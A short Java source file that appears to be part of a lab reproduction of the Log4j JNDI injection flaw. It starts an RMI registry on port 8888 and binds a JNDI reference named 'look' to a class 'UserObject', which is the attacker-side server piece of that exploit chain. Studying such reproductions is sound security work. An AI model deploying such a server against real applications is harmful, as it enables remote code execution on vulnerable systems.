package com.hz.yk.log4j.bug;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author wuzheng.yk
 * @date 2022/8/27
 */
public class RmiRemoteServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        //
        Registry registry = LocateRegistry.createRegistry(8888);
        //
        Reference ref = new Reference("com.hz.yk.log4j.bug.UserObject", "com.hz.yk.log4j.bug.UserObject", null);
        ReferenceWrapper remote = new ReferenceWrapper(ref);
        registry.bind("look",remote);
        System.out.println(" rmi server is ready ...");
    }
}


